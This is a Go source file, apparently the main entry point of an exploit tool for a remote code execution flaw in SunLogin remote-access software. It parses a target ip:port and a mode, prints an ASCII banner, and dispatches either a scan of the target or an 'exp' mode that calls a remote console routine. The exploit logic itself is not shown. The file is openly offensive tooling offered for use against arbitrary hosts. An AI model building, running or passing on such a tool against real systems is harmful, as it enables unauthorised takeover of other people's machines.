package main

import (
	"flag"
	"fmt"
)

var host, mode string

func main() {

	sunloginRce := NewSunLoginRce()

	flag.StringVar(&host, "h", "", "ip:port")
	flag.StringVar(&mode, "m", "", "scan&exp")
	flag.Parse()

	view := ` 
 ___  __  __  _  _  __    _____   ___  ____  _  _    ____   ___  ____ 
/ __)(  )(  )( \( )(  )  (  _  ) / __)(_  _)( \( )  (  _ \ / __)( ___)
\__ \ )(__)(  )  (  )(__  )(_)( ( (_-. _)(_  )  (    )   /( (__  )__) 
(___/(______)(_)\_)(____)(_____) \___/(____)(_)\_)  (_)\_) \___)(____)  by:Z92G`
	fmt.Println(view)
	fmt.Println()

	if host == "" || mode == "" {
		fmt.Println("[INFO]:Host ro Mode is Null")
		return
	}
	switch mode {
	case "scan":
		sunloginRce.ScanRce(host)
	case "exp":
		sunloginRce.RecConsole(host)
	default:
		fmt.Println("[INFO]:Input Err")
		return
	}

}
